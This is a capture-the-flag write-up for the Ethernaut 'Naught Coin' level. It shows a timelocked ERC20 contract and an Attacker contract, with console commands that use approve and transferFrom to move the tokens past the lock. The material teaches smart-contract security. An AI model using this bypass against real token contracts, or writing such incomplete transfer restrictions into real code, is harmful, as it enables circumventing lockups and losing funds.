# 15. Naught Coin

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

## Vulnerability

As this contract inherits from ERC20, we can call any standard ERC20 function on it: especially `approve(address to, uint256 amount)` which will allow another account to spend funds on behalf of the first account. Thus, bypassing :

```solidity
   if (msg.sender == player) {
      require(now > timeLock);
      _;
    }
```


We are going to need 2 accounts, the first one must be your user account (EOA) while the second one can be EOA or CA, I went for a smart contract as the second account.

My smart contract is :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {

    address targetContract;
    address myAccount;

    constructor(address _myAccount, address _targetContract) {
        myAccount = _myAccount;
        targetContract = _targetContract;
    }

    function attack() public {
        uint256 balance = IERC20(targetContract).balanceOf(myAccount);
        IERC20(targetContract).transferFrom(myAccount, address(this), balance);
    }
    
}
```
Just deploy it with your first account address as first parameter and the challenge instance address as the second parameter.
Let's assume that my contract is deployed at address `ADDRESS_OF_SECOND_ACCOUNT`.

Then from your first account, in the ethernaut console :

```js
const balance = await contract.balanceOf("ADDRESS_OF_FIRST_ACCOUNT");
await contract.approve("ADDRESS_OF_SECOND_ACCOUNT", balance);
```

From Remix for example, just call your contract attack function, that will transfer all the funds to the smart contract account since it was approved to do so by the holder of the tokens : `ADDRESS_OF_FIRST_ACCOUNT`.

You can submit the challenge !

